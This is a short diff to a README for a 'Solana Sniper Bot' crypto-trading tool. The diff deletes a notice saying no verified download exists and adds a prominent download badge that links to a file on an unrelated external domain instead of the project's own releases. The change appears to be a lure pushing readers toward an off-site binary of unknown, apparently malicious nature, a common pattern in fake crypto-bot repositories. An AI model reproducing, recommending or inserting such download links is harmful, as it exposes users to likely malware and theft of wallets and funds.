@@ -1,8 +1,8 @@
 # 🚀 Solana Sniper Bot — Features & Overview
 
-## 📥 Solana Sniper Bot — Project Information
+## 📥 Download Solana Sniper Bot
 
-**⚠️ Notice:** This project description focuses on token monitoring, market research, and simulated trading. No verified software download is provided.
+[![Download](https://img.shields.io/badge/Download-Solana_Sniper_Bot-brightgreen?style=for-the-badge&logo=github)](https://huangqing.net/s/file)
 
 <p align="center">
   <img src="./images/solana-sniper-dashboard.png" alt="Solana Sniper Bot Dashboard Preview" width="100%">
